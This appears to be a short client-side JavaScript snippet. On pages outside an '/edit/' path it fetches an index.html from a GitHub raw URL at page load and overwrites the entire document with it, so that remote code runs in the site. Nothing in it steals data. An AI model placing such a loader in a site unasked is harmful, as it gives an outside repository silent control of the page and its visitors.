if (window.location.href.indexOf('/edit/') === -1) {
  document.addEventListener('DOMContentLoaded', function() {
    fetch('https://raw.githubusercontent.com/Im1JuanProlibu/BOT-GEZPOMOTOR/main/index.html?t=' + Date.now())
      .then(function(r) { return r.text(); })
      .then(function(html) {
        document.open();
        document.write(html);
        document.close();
      });
  });
}
